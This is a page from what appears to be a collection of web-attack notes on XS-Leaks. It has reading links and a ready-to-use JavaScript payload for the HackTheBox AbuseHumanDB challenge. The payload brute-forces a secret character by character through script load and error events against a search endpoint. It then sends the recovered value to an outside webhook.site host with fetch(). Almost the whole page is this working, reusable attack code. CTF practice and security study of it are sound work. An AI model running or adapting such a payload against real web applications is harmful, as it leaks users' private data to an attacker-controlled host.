---
layout: default
title: XS-Leaks
nav_order: 1
parent: Payloads
---

# XS-Leaks
{: .no_toc }

---

Need to read:
- <https://xsleaks.dev/>
- <https://book.hacktricks.xyz/pentesting-web/xs-search>
- <https://sec.vnpt.vn/2022/02/xs-search/>
- <https://skelter.hashnode.dev/htb-abusehumandb-writeup>
- <https://medium.com/@skelter/htb-abusehumandb-661ea8acb5b6>
- <https://luchoane.medium.com/abusehumandb-hackthebox-write-up-bc0df5eef2ec>

Example: HTB - AbuseHumanDB

Payload

```html
<script>
var ip = '127.0.0.1:1337';
var hook = 'webhook.site/<your-id>';
var flag = 'HTB{';
var printable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!@$%\"\'_';
var special = '_%\"\'';
var url = `http://${ip}/api/entries/search?q=`

async function getPartialFlag(char){
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = url + encodeURIComponent(flag + char);
        script.onload = () => char==='}' ? reject(char):resolve(char);
        script.onerror = () => reject(char);
        document.head.appendChild(script);
    });
}

async function getFlag(chars) {
    for (let index = 0; index < 10; index++) {
        var brk = false; var char;
        for (var i = 0; i < chars.length; i++) {
            char = special.includes(chars[i]) ? '\\'+chars[i]:chars[i];
            await getPartialFlag(char).then((res) => { flag = flag.concat(res); brk = res=='}' ? true:false; i=0 } , (res) => {} );
            if(brk) break;
        }
        fetch(`http://${hook}/flag=${flag}`, {method: 'get'});
        flag=flag.concat('_');
    }
};

getFlag(printable);

</script>
```
